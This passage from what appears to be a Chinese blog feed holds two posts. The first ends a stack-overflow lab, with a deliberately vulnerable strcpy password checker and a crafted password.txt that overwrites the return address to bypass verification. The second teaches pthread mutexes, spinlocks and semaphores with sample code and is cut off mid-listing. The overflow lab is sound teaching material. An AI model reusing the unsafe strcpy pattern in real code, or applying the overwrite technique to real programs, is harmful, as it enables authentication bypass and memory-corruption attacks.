(‘2’)</td><td>0x33 (‘3’)</td><td>0x34 (‘4’)</td></tr></tbody></table><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220519233124853.png" alt="image-20220519233124853"></p><p>返回地址用于在当前函数返回时重定向程序的代码。在函数返回的“ retn” 指令执行时，栈顶元素恰好是这个返回地址。“retn”指令会把这个返回地址弹入 EIP 寄存器，之后跳转到这个地址去执行。</p><p>返回地址本来是 0x004010EB，对应的是 main 函数代码区的指令，现在我们通过溢出 buff 覆盖返回地址为 0x00323334，函数返回时，将 0x00323334 装入 EIP 寄存器，从内存 0x00323334 处取址，由于此处没有合法指令，处理器不知如何处理，报错。</p><p>但如果这里是一个有效的指令地址，就能让处理器跳转到任意指令区去执行，我们可以通过淹没返回地址而控制程序的执行流程。</p><h2 id="控制程序的执行流程"><a class="markdownIt-Anchor" href="#控制程序的执行流程"></a> 控制程序的执行流程</h2><p>用键盘输入字符的 ASCII 表示范围有限，很多值（如 0x11、 0x12 等符号）无法直接用键盘输入，所以我们将程序的输入由键盘改为<strong>从文件中读取字符串</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span> <span class="params">(<span class="type">char</span> *password)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> authenticated;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">    authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,password);<span class="comment">//over flowed here!</span></span><br><span class="line">    <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="keyword">if</span>(!(fp=fopen(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;rw+&quot;</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,password);</span><br><span class="line">    valid_flag = verify_password(password);</span><br><span class="line">    <span class="keyword">if</span>(valid_flag)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序的基本逻辑和上一节中的代码大体相同，只是现在将从同目录下的 password.txt 文件中读取字符串。</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows XP SP3</td><td>其他 Win32 操作系统也可进行本实验</td></tr><tr><td>编译器</td><td>Visual C++ 6.0</td><td>如使用其他编译器，需重新调试</td></tr><tr><td>编译选项</td><td>默认编译选项</td><td>VS2003 和 VS2005 中的 GS 编译选项会使栈溢出实验失败</td></tr><tr><td>build 版本</td><td>debug 版本</td><td>如使用 release 版本，则需要重新调试</td></tr></tbody></table><blockquote><p>用 VC6.0 将上述代码编译链接（使用默认编译选项， Build 成 debug 版本），在与 PE 文件同目录下建立 password.txt 并写入测试用的密码之后，就可以用 OllyDbg 加载调试了。</p></blockquote><p>动态调试时，需要我们做的工作：</p><p>（1）摸清楚栈中的状况，如函数地址距离缓冲区的偏移量等。<br>（2）得到程序中密码验证通过的指令地址，以便程序直接跳去这个分支执行。<br>（3）在 password.txt 文件的相应偏移处填上这个地址。</p><p>这样 verify_password 函数返回后就能直接跳转到验证通过的分支执行了。</p><p>用OllyDbg 加载 可执行文件，【找到验证的程序分支的指令地址为】按G调出程序执行的流程图，分析一下程序执行流程。<br><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220605154207339.png" alt="image-20220605154207339"></p><p>从上面的流程图中，可以发现，在<code>401111</code>处的指令进行了程序验证。</p><p><code>0x00401102</code> 调用了 verify_password 函数，之后在 <code>0x0040110A</code> 处将EAX中的返回值取出，在 <code>0x0040110D</code>处与0比较，然后决定跳转到提示验证通过的分支或是提示验证失败的分支。</p><p>提示验证通过的分支从 <code>0x00401122</code>处的参数压栈开始。如果我们把返回地址覆盖成这个地址，那么在 <code>0x00401102</code>处的函数调用返回后，程序将跳转到验证通过的分支，而不是进入分支判断代码。</p><p>通过动态调试，发现栈帧中的变量分布情况基本没变。这样我们按如下方法构造 password.txt 中的数据。<br><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220605162225968.png" alt="image-20220605162225968"></p><p>构造思路：用2个 “4321”来填充 buffer[8]，第3个“4321”来覆盖 authenticated，第4个“4321”覆盖前栈帧 EBP，第5个“4321” 的 ASCII码值 0x34333231 修改成验证通过分支的指令地址 0x00401122。</p><p>在构造 password.txt 时，我们需要用到一个软件 Ultraedit，通过它来编辑十六进制。</p><p>构造步骤：</p><ol><li><p>创建一个 password.txt文件，写入5个“4321”，放在实验程序的目录中。<br><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220605163446828.png" alt="image-20220605163446828"></p></li><li><p>用 Ultraedit32 打开 password.txt<br><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220605163838554.png" alt="image-20220605163838554"></p></li><li><p>切换至十六进制编辑模式。<br><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220605163926732.png" alt="image-20220605163926732"></p></li><li><p>将最后4个字节修改为新的返回地址 0x00401122，注意：由于“大顶端”，我们需要逆序输入这4个字节</p><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220605164113427.png" alt="image-20220605164113427"></p></li></ol><p>将 password.txt 保存后，用 OllyDbg 加载程序并调试，可以看到最终的栈状态如表所示。</p><table><thead><tr><th>局部变量名</th><th>内存地址</th><th>偏移 3 处的值</th><th>偏移 2 处的值</th><th>偏移 1 处的值</th><th>偏移 0 处的值</th></tr></thead><tbody><tr><td>buffer[0~3]</td><td>0x0012FB14</td><td>0x31 (‘1’)</td><td>0x32 (‘2’)</td><td>0x33 (‘3’)</td><td>0x34 (‘4’)</td></tr><tr><td>buffer[4~7]</td><td>0x0012FB18</td><td>0x31 (‘1’)</td><td>0x32 (‘2’)</td><td>0x33 (‘3’)</td><td>0x34 (‘4’)</td></tr><tr><td>authenticated（被覆盖前）</td><td>0x0012FB1C</td><td>0x00</td><td>0x00</td><td>0x00</td><td>0x01</td></tr><tr><td>authenticated（被覆盖后）</td><td>0x0012FB1C</td><td>0x31 (‘1’)</td><td>0x32 (‘2’)</td><td>0x33 (‘3’)</td><td>0x34 (‘4’)</td></tr><tr><td>前栈帧 EBP（被覆盖前）</td><td>0x0012FB20</td><td>0x00</td><td>0x12</td><td>0xFF</td><td>0x80</td></tr><tr><td>前栈帧 EBP（被覆盖后）</td><td>0x0012FB20</td><td>0x31 (‘1’)</td><td>0x32 (‘2’)</td><td>0x33 (‘3’)</td><td>0x34 (‘4’)</td></tr><tr><td>返回地址（被覆盖前）</td><td>0x0012FB24</td><td>0x00</td><td>0x40</td><td>0x11</td><td>0x07</td></tr><tr><td>返回地址（被覆盖后）</td><td>0x0012FB24</td><td>0x00</td><td>0x40</td><td>0x11</td><td>0x22</td></tr></tbody></table><p>程序执行状态如下图所示。<br><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220605164434401.png" alt="image-20220605164434401"></p><p>由于站内EBP被覆盖为无效值，使得程序在退出时堆栈无法平衡，导致崩溃。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;基础知识&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#基础知识&quot;&gt;&lt;/a&gt; 基础知识&lt;/h1&gt;
&lt;h2 id=&quot;二进制文件概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#二进制</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="栈" scheme="https://www.rgzzplus.com/tags/%E6%A0%88/"/>
    
  </entry>
  
  <entry>
    <title>线程的同步互斥</title>
    <link href="https://www.rgzzplus.com/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/"/>
    <id>https://www.rgzzplus.com/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/</id>
    <published>2022-05-10T07:06:44.000Z</published>
    <updated>2022-08-01T11:15:34.191Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="操作系统同步互斥"><a class="markdownIt-Anchor" href="#操作系统同步互斥"></a> 《操作系统》同步互斥</h1><h1 id="引起同步互斥问题的原因"><a class="markdownIt-Anchor" href="#引起同步互斥问题的原因"></a> 引起同步互斥问题的原因</h1><p>​当下人们需要让进程在短时间内同时完成不止一件事情，每个线程处理各自独立的任务。线程是进程的更小分支，每一线程完成进程的一部分任务，但系统并不给线程分配任何资源，它共享创建它的进程所拥有的资源。但是当一个线程修改变量时，其它线程在读取这个变量时可能读取到不一致的值，无法区分到底是读取了修改前的值，还是修改后的值，导致了程序执行结果无法复现，所以就引入了同步互斥，来解决进程内的资源分配问题。</p><h1 id="同步互斥方法说明"><a class="markdownIt-Anchor" href="#同步互斥方法说明"></a> 同步互斥方法说明</h1><h2 id="互斥锁-同步互斥方法说明"><a class="markdownIt-Anchor" href="#互斥锁-同步互斥方法说明"></a> 互斥锁 同步互斥方法说明</h2><p>​互斥锁，一个线程在进入临界区时应得到锁，在它退出时释放锁，以让其它需要的线程访问这个临界区。对于获得锁的进程，它会执行临界区的代码，同时其它未获得锁的线程会被阻塞，直到得到锁才会进入临界区。</p><h2 id="自旋锁-同步互斥方法说明"><a class="markdownIt-Anchor" href="#自旋锁-同步互斥方法说明"></a> 自旋锁 同步互斥方法说明</h2><p>​自旋锁与互斥锁原理基本相同，不同之处在于未获得锁时被阻塞的方法实现不同，互斥锁通过硬件方法阻塞，而自旋锁通过软件方法，即让线程空循环来等待。</p><h2 id="信号量-同步互斥方法说明"><a class="markdownIt-Anchor" href="#信号量-同步互斥方法说明"></a> 信号量 同步互斥方法说明</h2><p>​同步，一个线程完成了某一个动作就通过信号量告诉别的线程，别的线程再进行某些动作。而且信号量有一个更加强大的功能，信号量可以用作为资源计数器，把信号量的值初始化为某个资源当前可用的数量，使用一个之后递减，归还一个之后递增。</p><h2 id="条件变量-同步互斥方法说明"><a class="markdownIt-Anchor" href="#条件变量-同步互斥方法说明"></a> 条件变量 同步互斥方法说明</h2><p>​条件变量，用while循环作判断条件，循环条件满足线程进入工作队列等待，直到其它线程的执行使得条件满足后，该线程才会跳出循环，继续执行剩余代码。</p><h2 id="屏障-同步互斥方法说明"><a class="markdownIt-Anchor" href="#屏障-同步互斥方法说明"></a> 屏障 同步互斥方法说明</h2><p>​屏障允许等待任意数目的线程都到达某一点，直到到达该点的线程达到规定数目，然后从该点继续执行，而不用线程退出。</p><h2 id="读写锁-同步互斥方法说明"><a class="markdownIt-Anchor" href="#读写锁-同步互斥方法说明"></a> 读写锁 同步互斥方法说明</h2><p>​读写与互斥量类似，读写锁有3种状态，读模式加锁，写模式加锁，不加锁。一次只能有一个线程占有写模式的读写锁，但是多个线程可以同时占有读模式的读写锁。</p><h1 id="同步互斥方法实现"><a class="markdownIt-Anchor" href="#同步互斥方法实现"></a> 同步互斥方法实现</h1><h2 id="互斥锁-同步互斥方法实现"><a class="markdownIt-Anchor" href="#互斥锁-同步互斥方法实现"></a> 互斥锁 同步互斥方法实现</h2><h3 id="互斥锁-同步互斥示例代码"><a class="markdownIt-Anchor" href="#互斥锁-同步互斥示例代码"></a> 互斥锁 同步互斥示例代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ticketAmount = <span class="number">2</span>; <span class="comment">//全局变量</span></span><br><span class="line"><span class="type">pthread_mutex_t</span> lock = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"><span class="comment">//创建全局锁并初始化</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">ticketAgent</span><span class="params">(<span class="type">void</span>* arg)</span>&#123;</span><br><span class="line">    pthread_mutex_lock(&amp;lock);  <span class="comment">//上锁</span></span><br><span class="line">    <span class="type">int</span> t = ticketAmount;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (t &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;售出一张票!\n&quot;</span>);</span><br><span class="line">        t--;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;票已经卖完了!!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ticketAmount = t;</span><br><span class="line">    pthread_mutex_unlock(&amp;lock);        <span class="comment">//解锁</span></span><br><span class="line">    pthread_exit(<span class="number">0</span>);                <span class="comment">//退出线程</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> ticketAgent_tid[<span class="number">2</span>];   <span class="comment">//创建线程pid</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_create(ticketAgent_tid+i, <span class="literal">NULL</span>, ticketAgent,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;<span class="comment">//创建两个线程</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_join(ticketAgent_tid[i],<span class="literal">NULL</span>);</span><br><span class="line">    &#125;<span class="comment">//让主线程等待其它线程完成</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;还剩下 %d张票\n&quot;</span>, ticketAmount);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>未加锁：<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510142206661.png" alt="未加锁"></p><p>加锁：<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510140450091.png" alt="加锁"></p><h3 id="312-互斥锁-同步互斥关键代码说明"><a class="markdownIt-Anchor" href="#312-互斥锁-同步互斥关键代码说明"></a> 3.1.2 互斥锁 同步互斥关键代码说明</h3><ol><li><p>pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;<br>//创建全局锁并初始化</p></li><li><p>pthread_mutex_lock(&amp;lock);  //上锁</p></li><li><p>pthread_mutex_unlock(&amp;lock);   //开锁</p></li></ol><h2 id="32-自旋锁-同步互斥方法实现"><a class="markdownIt-Anchor" href="#32-自旋锁-同步互斥方法实现"></a> 3.2 自旋锁 同步互斥方法实现</h2><h3 id="321-自旋锁-同步互斥示例代码"><a class="markdownIt-Anchor" href="#321-自旋锁-同步互斥示例代码"></a> 3.2.1 自旋锁 同步互斥示例代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ticketAmount = <span class="number">2</span>; <span class="comment">//全局变量</span></span><br><span class="line"><span class="type">pthread_spinlock_t</span> lock;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">ticketAgent</span><span class="params">(<span class="type">void</span>* arg)</span>&#123;</span><br><span class="line">    pthread_spin_lock(&amp;lock);  <span class="comment">//上锁</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> t = ticketAmount;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (t &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;售出一张票!\n&quot;</span>);</span><br><span class="line">        t--;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;票已经卖完了!!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ticketAmount = t;</span><br><span class="line">    pthread_spin_unlock(&amp;lock);        <span class="comment">//解锁</span></span><br><span class="line">    pthread_exit(<span class="number">0</span>);                <span class="comment">//退出线程</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    pthread_spin_init(&amp;lock,PTHREAD_PROCESS_PRIVATE);</span><br><span class="line">    <span class="type">pthread_t</span> ticketAgent_tid[<span class="number">2</span>];   <span class="comment">//创建线程pid</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_create(ticketAgent_tid+i, <span class="literal">NULL</span>, ticketAgent,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;<span class="comment">//创建两个线程</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_join(ticketAgent_tid[i],<span class="literal">NULL</span>);</span><br><span class="line">    &#125;<span class="comment">//让主线程等待其它线程完成</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;还剩下 %d张票\n&quot;</span>, ticketAmount);</span><br><span class="line">    pthread_spin_destroy(&amp;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>未加锁：<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510142626566.png" alt="未加锁"></p><p>加锁：<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510142535492.png" alt="加锁"></p><h3 id="自旋锁-同步互斥关键代码说明"><a class="markdownIt-Anchor" href="#自旋锁-同步互斥关键代码说明"></a> 自旋锁 同步互斥关键代码说明</h3><ol><li><p>int pthread_spin_init(pthread_spinlock_t *lock, int pshared);<br>//初始化自旋锁，pshared 参数表示自旋锁是否能被其它进程共享。</p></li><li><p>int pthread_spin_destroy(pthread_spinlock_t *lock);<br>//销毁自旋锁，释放其资源</p></li><li><p>Int pthread_spin_lock(pthread_spinlock_t *lock);<br>// 获得锁，如果锁未被占用，则将锁锁上，防止其它进程获得锁，如果锁被占中，则线程将一直循环等待，直到锁被释放获得锁</p></li><li><p>Int pthread_spin_unlock(pthrad_spinlock_t *lock);<br>// 释放锁</p></li></ol><h2 id="号量-同步互斥方法实现"><a class="markdownIt-Anchor" href="#号量-同步互斥方法实现"></a> 号量 同步互斥方法实现</h2><h3 id="信号量-同步互斥示例代码"><a class="markdownIt-Anchor" href="#信号量-同步互斥示例代码"></a> 信号量 同步互斥示例代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXTP 1 <span class="comment">//代表有资源</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXTC 0<span class="comment">//代表无资源</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> full_v = <span class="number">0</span>;<span class="comment">//统计有产品的位置数，占位数</span></span><br><span class="line"><span class="type">int</span> empty_v = <span class="number">5</span>;<span class="comment">//统计空位数</span></span><br><span class="line"><span class="type">int</span> buff[<span class="number">5</span>]=&#123;<span class="number">0</span>&#125;;<span class="comment">//位置缓冲池</span></span><br><span class="line"><span class="type">int</span> in = <span class="number">0</span>;<span class="comment">//指向下一个空位的索引</span></span><br><span class="line"><span class="type">int</span> out = <span class="number">0</span>;<span class="comment">//指向下一个产品位置的索引</span></span><br><span class="line"><span class="type">sem_t</span> empty;</span><br><span class="line"><span class="type">sem_t</span> full;</span><br><span class="line"><span class="type">sem_t</span> mutex;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> *buff,<span class="type">int</span> k)</span><span class="comment">//输出数组</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,*(buff+i));</span><br><span class="line"><span class="keyword">if</span>(i == k - <span class="number">1</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;&#125;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">producer</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">sem_wait(&amp;empty);<span class="comment">//empty = 0 则阻塞，empty &gt; 0则获取一个信号量，向下执行</span></span><br><span class="line"><span class="keyword">if</span>(empty_v != <span class="number">0</span>)&#123;</span><br><span class="line">empty_v--;</span><br><span class="line"></span><br><span class="line">sem_wait(&amp;mutex);</span><br><span class="line">buff[in] = NEXTP;</span><br><span class="line">in = (in + <span class="number">1</span>)% <span class="number">5</span>;<span class="comment">//实现循环放置</span></span><br><span class="line">print(buff,<span class="number">5</span>);</span><br><span class="line">sem_post(&amp;mutex);<span class="comment">//释放一个信号量</span></span><br><span class="line"></span><br><span class="line">full_v++;</span><br><span class="line">sem_post(&amp;full);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>);</span><br><span 